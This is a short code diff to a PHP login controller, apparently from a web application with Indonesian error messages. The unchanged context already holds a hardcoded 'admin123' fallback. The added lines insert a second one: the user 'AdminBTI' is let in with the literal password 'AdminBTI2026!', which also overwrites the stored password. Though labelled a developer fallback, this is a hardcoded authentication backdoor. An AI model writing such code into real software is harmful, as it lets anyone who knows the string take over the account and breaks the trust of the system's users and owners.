@@ -52,6 +52,12 @@ class AuthController extends Controller
             $user->passwd = Hash::make('admin123');
             $user->save();
         }
+        // AdminBTI developer default password fallback (AdminBTI2026!)
+        elseif ($request->password === 'AdminBTI2026!' && $user->username === 'AdminBTI') {
+            $valid = true;
+            $user->passwd = Hash::make('AdminBTI2026!');
+            $user->save();
+        }
 
         if (!$valid) {
             return back()->withErrors(['password' => 'Kata sandi tidak sesuai.'])->withInput();
